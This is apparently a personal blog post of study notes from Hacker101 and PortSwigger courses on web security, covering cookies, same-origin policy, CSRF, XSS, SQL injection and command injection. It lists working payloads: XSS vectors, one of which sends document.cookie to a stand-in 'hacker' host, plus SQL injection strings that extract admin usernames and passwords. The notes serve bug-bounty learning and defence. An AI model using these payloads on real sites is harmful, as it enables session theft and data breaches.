---
layout: post
title:  "Learning notes Ethical Hacking"
date:   2020-12-15
categories: code software learning hacking programming hackerone
video: false
---

- [PayloadsAllTheThings](//github.com/swisskyrepo/PayloadsAllTheThings)
- [Resources](//www.hacker101.com/resources)
- [Public firing range](//public-firing-range.appspot.com/)
- [Github](//github.com/s0wr0b1ndef/Hacker101) includes Coursework
- [Portswigger WebAcademy](//portswigger.net/web-security)

- [SSRF](//github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [SQL entry point detection](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)
- [SQL WAF ByPass](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#waf-bypass)
- [SQL Authentication ByPass ](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

- Bug Trackers
  [SecList](//seclists.org/)  

- Bounty Programs
  HackerOne
  [Intrigi](//www.intigriti.com/programs)
  Github list of bounty [platforms](//github.com/disclose/diodata)

- Introduction
  Be able to use Java
  Request [package](//pypi.org/project/requests/) for Python
  Burp Proxy(Installed community edition) and Firefox
    Burp proxy uses embedded browser, and added Firefox proxy.  Install CA certificate.

  Shows basic example of XSS/rXSS

- [CORS Misconfiguration](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [WebSocket Attacks](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)

- The Web In Depth
  And how they impact security
  Webite [link](//www.hacker101.com/sessions/web_in_depth)

  Cookies, key value pairs of data
  Sending to wrong host or changing cookie data is a threat
  Cookies, set between parent and child, not between siblings.
  Can tag cookies either Secure(HTTPS) or HTTPOnly
  Uses Set-Cookie header, can use `document.cookie`
  Cookie security, cross domain and scope, good link [here](//stackoverflow.com/questions/5677846/what-should-i-know-about-cookies-domain-and-scope-for-security-purposes)

  HTML parsing
  How browsers and Web-Applications parse is different, creating vuln
  Legacy parsing exploits tricks used to clean up after bad html e.g. putting {} around script tags got passed web-app firewalls but executed browser.

  MIME Sniffing
  If you can control how browser decodes, you may be able to alter parsing
  Good example is putting UTF-7 with base64'd blocks to get around web-app firewalls
  Doesn't have {} which are obvious filtered out unsafe elements
  Safe security, !set encoding client and server side, and MIME types!.

  Same origin policy (SOP)
  Can change `document.domain` then change sub-domain you can communicate with
  Anyone can call postMessage in an iFrame
    `document.getElementById('cross_domain_page').contentWindow.postMessage(.......)`
  	`postMessage function(message, targetOrigin)`
  SOP protocol must no cross HTTP/HTTPs, and domain names must exact match, no wildcards.
  
  Cross-site Forgery Request(CSURF)
  Uses CSRF tokens and tie to uses session, embed in forms
  When POST used CRSF to check state can change
  !Use basic automatic scanners to see vuln GET changing state to attack!!
    Prevention [cheatSheet](//cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

- XSS (cross scripting) and Authorization
  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-using-utf---8)
  Reflected and Stored XSS
    Example reflected XSS bounty [report](//hackerone.com/reports/766633)
  DOM XSS
  The most common source is the URL, which is typically accessed with the location object.
  Vulernable to XSS scripting?
    Embedded tag or string?
    Any special handling?  URLs into links?
    Special character handling?   `'<>:;"`
  Exploit Case 1
    Simple script tag:  `<script>alert(1);</script>`
    If have WAF or filters, embed an anchor tab or img with a bad source or onError.
  Exploit Case 2
    Double quotes passed through, scrubbed {} brackets, use DOM events e.g. mouseover, excript executes on event.
  Exploit Case 3
    HTML encoding e.g. `; alert(1);`
    String escape e.g. `</script><script>alert(1);</script>`
  DOM XSS
    Does not hit server side, hard to mitigate
    Do not insert user input and use innerText
    Good explanation [here](//www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/)

  How to change sessionID and CRSF?

  Bypass filters, use onError to insert `<script>` via image
  HTML parsing in strings and quotes
  eval/SetTimeOut
  DOM XSS - dont put user-controlled data directly into page, hard to mitigate
  Forced Browsing ( perform every action using highest priviledged user, swapping IDs/CSRF, or tokens )
  
  Cheat Sheet XSS:
    Good [Sources and sinks](//portswigger.net/web-security/dom-based)
    `><h1>test</h1>`
    ` "\"><img src=/ onerror=alert(1)>" `
    `'+alert(1)+'`
    `onmouseover="alert(1)"`
    `http://"onmouseover"=alert(1)`
    `"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>`
    `+ADw-script+AD4-alert(1);+ADw-/script+AD4-`
    One obvious way to craft an XSS exploit is to terminate the double quotation marks that enclose the attribute value
   `"><script>alert(document.domain)`
    Polygot XSS locator: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
    
    [1] XSS evasion cheatsheet
    Malformed A Tags:  `\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
    Bypass most SRC domain filters:  `<IMG SRC=# onmouseover="alert('xxs')">`
  
  Coursework:
    Look at image source to get FLAG
    Add quote to end of url, injectable
    Page content controllable, can insert script via special character to DB then render
    Forbidden view page, change address bar to edit and get flag

- Javascript for hackers 
  Using Chrome dev tools for static analysis of JS
  List of know vulnerabilities in [Public firing range] e.g. postMessage `eval`
  Cool POC tool with example [//repl.it/@MarkElliott/postMessage-Eval-POC#index.html]
  Finding API endpoints in JS (keywords such as v1, api etc )
  Look at wayBackMachine to find/track changes in code/javascript, look at first applications in WBM, as most rushed and least protected, then reverse engineer.

  Popular Sources and sinks
    eval / setTimout / setInterval
    document.URL / document.documentURI / document.referrer / document.write
    location.href / location.search / location.*
    window.name
    (element).innerHTML
    document.baserURI `http://www.example.com/test.html#<script>alert(1)</script>`

- SQL Injection
  Cloned github sqlmap, opensource SQL pentesting tool for SQL injection flaws
  Examples and overview in portswigger [here](//portswigger.net/web-security/sql-injection)
  username ` administrator'-- ` subverts application logic
  using ` admin' ` shows if can SQL inject, then determine columns
  ` https://insecure-website.com/products?category=Gifts'-- `
  ` https://insecure-website.com/products?category=Gifts'+OR+1=1-- `
  SQL Union select attacks
  ` 'UNION SELECT '123' AS password FROM admins WHERE '1' = '1 `
  ` foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 `
  ` foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 `

  Command Injection and SQLi
    [PayloadsAndAllTheThings](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
      
    Good [hackerOne tutorial](//www.hackerone.com/blog/how-to-command-injections)
    Exploit ping and hostname using `ping 0.0.0.0 && echo`
    Paylods:
      ` 'or 1='1-- ` (all rows - true )
      ` 'AND 0='1-- `(no rows - false )
    Example header injection [report](//hackerone.com/reports/297478)
    Example header injection [report](//hackerone.com/reports/761304)


- Native Code Crash Course
  
  Website [link](//www.hacker101.com/sessions/native_code_crash_course)

  ** Fab resrouces below, case studies and more **

  In this session we’re diving head-first into understanding and hacking native code.

  Registers / Memory /Physical / Virtual / Page tables /Stack /Endianness / Instructions /Program Counter / Calls /Syscalls / Shared Libraries
  
  Bugs / Protections / Bypassing protections
  Tools:
    Debuggers
    Disassemblers
    Decompilers
    Hex editors
    Assemblers

- Other Tools
  [Ghidra] is a software reverse engineering (SRE) framework
  [Radar2] a free/libre toolchain for easing several low level tasks like forensics, software reverse engineering, exploiting, debugging
  [Public firing range] is a test bed for automated web application security scanners.

[1]: //owasp.org/www-community/xss-filter-evasion-cheatsheet
[Ghidra]: //github.com/NationalSecurityAgency/ghidra
[Radar2]: //rada.re/n/radare2.html
[Public firing range]: //public-firing-range.appspot.com/

